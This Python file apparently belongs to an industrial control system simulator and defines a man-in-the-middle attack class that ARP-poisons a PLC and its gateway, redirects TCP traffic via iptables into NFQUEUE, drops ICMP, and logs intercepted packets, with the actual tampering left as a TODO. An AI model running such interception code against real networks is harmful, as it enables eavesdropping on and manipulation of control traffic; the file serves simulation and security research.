import argparse
import os
import threading
import ctypes
from pathlib import Path

import fnfqueue
from scapy.layers.inet import IP, TCP

from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
from synced_attack import SyncedAttack

class PacketThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        try:
            for packet in self.queue:
                # TODO The actual mitm stuff
                packet2 = IP(packet.payload)
                print("MITM 💻:", "Packet 📦:", "source:", packet2[IP].src.ljust(16), str(packet2[TCP].sport).ljust(6),
                      "   destination:",
                      packet2[IP].dst.ljust(16), str(packet2[TCP].dport).ljust(6), )

                packet.mangle()

        except fnfqueue.BufferOverflowException:
            print("Buffer Overflow in a MITM attack!")

    def get_id(self):
        # returns id of the respective thread
        if hasattr(self, '_thread_id'):
            return self._thread_id
        for id, thread in threading._active.items():
            if thread is self:
                return id

    def stop_thread(self):
        thread_id = self.get_id()
        res = ctypes.pythonapi.PyThreadState_SetAsyncExc(thread_id, ctypes.py_object(SystemExit))
        if res > 1:
            ctypes.pythonapi.PyThreadState_SetAsyncExc(thread_id, 0)
            print('Exception raise failure')

class MitmAttack(SyncedAttack):
    """
    This is a Man In The Middle attack class. This kind of attack will modify
    the data that is passed around in packages on the network, in order to
    change the values of tags before they reach the requesting PLC.

    A man in the middle attack always sits in between a PLC and its
    corresponding gateway.

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        os.system('sysctl net.ipv4.ip_forward=1')
        self.queue = fnfqueue.Connection()
        self.state = 0
        self.q = None
        self.thread = None
        self.run_thread = False

    def setup(self):
        # Add the iptables rules
        os.system('iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num 1')
        os.system('iptables -A FORWARD -p icmp -j DROP')
        os.system('iptables -A INPUT -p icmp -j DROP')
        os.system('iptables -A OUTPUT -p icmp -j DROP')

        launch_arp_poison("192.168.1.1", "192.168.1.254")

        try:
            self.q = self.queue.bind(1)
            self.q.set_mode(fnfqueue.MAX_PAYLOAD, fnfqueue.COPY_PACKET)
        except PermissionError:
            print("Permission Error. Am I running as root?")

        # self.run_thread = True
        self.thread = threading.Thread(target=self.packet_thread_function)
        self.thread.start()

        # self.thread = PacketThread(self.queue)
        # self.thread.start()

    def packet_thread_function(self):
        try:
            for packet in self.queue:
                # TODO The actual mitm stuff
                packet2 = IP(packet.payload)
                print("MITM 💻:", "Packet 📦:", "source:", packet2[IP].src.ljust(16), str(packet2[TCP].sport).ljust(6), "   destination:",
                      packet2[IP].dst.ljust(16), str(packet2[TCP].dport).ljust(6), )

                packet.mangle()

        except fnfqueue.BufferOverflowException:
            print("Buffer Overflow in a MITM attack!")

    def interrupt(self):
        if self.state == 1:
            self.teardown()

    def teardown(self):
        # Delete iptables rules
        os.system('iptables -t mangle -D PREROUTING -p tcp -j NFQUEUE --queue-num 1')
        os.system('iptables -D FORWARD -p icmp -j DROP')
        os.system('iptables -D INPUT -p icmp -j DROP')
        os.system('iptables -D OUTPUT -p icmp -j DROP')

        restore_arp("192.168.1.1", "192.168.1.254")

        print("test1")

        # self.run_thread = False
        # self.thread.stop_thread()
        self.queue.close()
        print("test2")

        self.thread.join()
        print("test3")

    def attack_step(self):
        if self.state == 0:
            if self.intermediate_attack["start"] <= self.get_master_clock() <= self.intermediate_attack["end"]:
                self.state = 1
                self.setup()
        elif self.state == 1:
            if not self.intermediate_attack["start"] <= self.get_master_clock() <= self.intermediate_attack["end"]:
                self.teardown()
                self.state = 2


def is_valid_file(parser_instance, arg):
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml", type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = MitmAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
